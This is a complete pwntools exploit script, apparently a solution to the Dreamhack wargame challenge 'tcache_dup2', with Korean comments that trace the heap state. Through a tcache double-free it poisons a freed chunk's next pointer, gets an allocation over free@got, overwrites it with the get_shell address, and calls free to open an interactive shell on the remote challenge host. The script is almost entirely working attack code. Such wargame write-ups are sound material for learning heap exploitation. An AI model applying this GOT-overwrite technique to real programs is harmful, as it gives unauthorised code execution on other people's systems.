from pwn import *

p = remote('host3.dreamhack.games', 14896)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> free@got
# tc_idx = 2
# chunk : ptr[1]
free_got = elf.got['free']
modify(1, 0x10, p64(free_got))


# tcache[0x20] : free@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))
# tcache에서 청크를 찾아서 할당할 때 해당 청크에 `e->key = NULL;`을 해서 `청크 + 0x8`을 `0x00`으로 초기화하기 때문에,
# 여기서 free@got를 할당할 때, [free@got + 0x8]에 위치하는 puts@got의 값이 NULL(0x00)으로 바뀜
# 사실 puts가 해당 바이너리에서 쓰이지 않지만, gdb를 통해서 확인해보면, `printf`에 포맷 스트링이 아닌 문자열만 쓰이는 경우 최적화를 통해 puts가 호출되는 경우가 있음
# 따라서 여기서 puts@got가 바뀌면, puts로 바뀐 printf 들이 출력이 안되서, `recvafter`에서 무한대기해서 아래로 못내려감

delete(0)

p.interactive()
